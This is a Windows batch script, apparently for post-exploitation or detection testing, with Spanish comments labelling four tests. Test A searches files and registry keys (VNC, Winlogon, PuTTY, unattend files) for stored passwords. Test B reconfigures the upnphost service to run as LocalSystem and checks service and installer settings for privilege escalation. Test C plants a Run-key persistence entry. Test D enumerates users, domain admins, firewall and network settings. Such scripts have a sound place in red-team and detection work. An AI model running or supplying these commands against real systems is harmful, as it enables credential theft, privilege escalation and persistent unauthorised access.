@echo off
 
:: Test A: Comandos para buscar claves cacheadas
findstr /si password *.txt
findstr /si password *.xml
findstr /si password *.ini
dir /s *pass* == *cred* == *vnc* == *.config*
findstr /spin "password" *.*
findstr /spin "password" *.*
type c:\sysprep.inf
type c:\sysprep\sysprep.xml
type c:\unattend.xml
type %WINDIR%\Panther\Unattend\Unattended.xml
type %WINDIR%\Panther\Unattended.xml
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"
reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP"
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s
 
:: Test B: Comandos para buscar servicios vulnerables
sc config upnphost obj= ".\LocalSystem" password= ""
sc config upnphost depend= ""
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> c:\windows\temp\permissions.txt
for /f eol^=^"^ delims^=^" %a in (c:\windows\temp\permissions.txt) do cmd.exe /c icacls "%a"
sc query state= all | findstr "SERVICE_NAME:" >> Servicenames.txt
FOR /F %i in (Servicenames.txt) DO echo %i
type Servicenames.txt
FOR /F "tokens=2 delims= " %i in (Servicenames.txt) DO @echo %i >> services.txt
FOR /F %i in (services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> path.txt
wmic process list brief | find "winlogon"
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated
 
:: Test C: Generar persistencia
REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "My App" /t REG_SZ /F /D "C:\ff.exe"
 
:: Test D: Enumeracion
systeminfo
hostname
whoami
echo %username%
net users
net localgroups
net user Administrador
net group /domain
net group /domain "Domain Admins"
netsh firewall show state
netsh firewall show config
ipconfig /all
route print
arp -A
wmic qfe get Caption,Description,HotFixID,InstalledOn